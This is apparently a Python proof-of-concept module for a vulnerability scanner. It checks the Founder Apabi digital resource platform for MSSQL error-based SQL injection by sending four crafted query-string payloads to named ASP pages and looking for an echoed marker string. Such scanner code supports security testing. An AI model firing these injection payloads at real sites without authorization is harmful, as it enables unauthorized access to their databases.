# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Founder_0004'  # 平台漏洞编号，留空
    name = '方正Apabi数字资源平台MSSQL SQL注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-03-26'  # 漏洞公布时间
    desc = '''
        北京方正阿帕比技术有限公司是北大方正信息产业集团有限公司旗下专业的数字出版技术及产品提供商。方正阿帕比公司自2001年起进入数字出版领域，在继承并发展方正传统出版印刷技术优势的基础上，自主研发了数字出版技术及整体解决方案，已发展成为全球领先的数字出版技术提供商。
        方正Apabi数字资源平台：
        /dlib/dir.asp?lang=gb&DocID=convert
        /tree/deeptree.asp?DocGroupID=convert
        /dlib/netlinkhandler.asp?lang=gb&DocGroupID=convert
        /dlib/AddMyFavourite.asp?lang=gb&DocID=convert 
        页面存在MSSQL SQL注射漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0102763/0102829/0102760/0102822'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '方正Apabi数字资源平台'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'faea57ef-9d77-4127-b17c-933ad181d501'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # No.3 http://www.wooyun.org/bugs/wooyun-2010-0102763
            # No.4 http://www.wooyun.org/bugs/wooyun-2010-0102829
            # No.5 http://www.wooyun.org/bugs/wooyun-2010-0102760
            # No.6 http://www.wooyun.org/bugs/wooyun-2010-0102822
            payloads = [
                "/dlib/dir.asp?lang=gb&DocID=convert%28int,%27hen%27%2b%27tai%27%29",
                "/tree/deeptree.asp?DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&hide=1&CategoryTypeID=1",
                "/dlib/netlinkhandler.asp?lang=gb&DocGroupID=convert%28int,%27hen%27%2b%27tai%27%29&FieldID=convert%28int,%27hen%27%2b%27tai%27%29&FieldName=Creator&FieldType=1&QueryValue=%C1%D6%C9%BD&Repeatable=True",
                "/dlib/AddMyFavourite.asp?lang=gb&DocID=convert%28int%2C%27hen%27%2b%27tai%27%29%20--%20hehe",
            ]
            for payload in payloads:
                url = self.target + payload
                code, head, body, errcode1, final_url = hh.http(url)
                if 'hentai' in body:
                    # security_hole(arg+payload)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，，漏洞地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=url))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
